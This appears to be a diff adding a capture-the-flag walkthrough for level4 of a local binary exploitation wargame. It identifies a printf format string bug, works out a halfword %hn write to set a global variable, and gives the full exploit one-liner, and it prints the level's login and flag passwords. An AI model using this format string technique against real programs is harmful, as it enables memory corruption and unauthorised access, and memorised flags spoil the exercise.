@@ -1,0 +1,33 @@
+1. Download the binary from the server:
+   scp -P 2222 level4@localhost:~/level4 .
+   Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+2. Analyze the binary with Ghidra:
+   - printf(buffer) in p() function (format string vulnerability)
+   - Global variable 'm' must equal 0x01025544 (16,930,116) to get flag
+   - Address of 'm': 0x08049810
+
+3. Find the stack position of your input:
+   python -c 'print "AAAA" + "%x."*20' | ./level4
+   Look for 41414141 -> Position 12
+
+4. Calculate the payload (multi-word write):
+   Target: 0x01025544
+   - Upper word (0x08049812): 0x0102 = 258 decimal
+   - Lower word (0x08049810): 0x5544 = 21,828 decimal
+   
+   Write in ascending order:
+   - Write 258 to 0x08049812 (position 12)
+   - Write 21,828 to 0x08049810 (position 13)
+
+5. Connect to the VM via SSH:
+   ssh level4@localhost -p 2222
+   Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+6. Execute the exploit:
+   (python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250x%12$hn%21570x%13$hn"'; cat) | ./level4
+
+7. Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+8. Exit and login as level5:
+   su level5
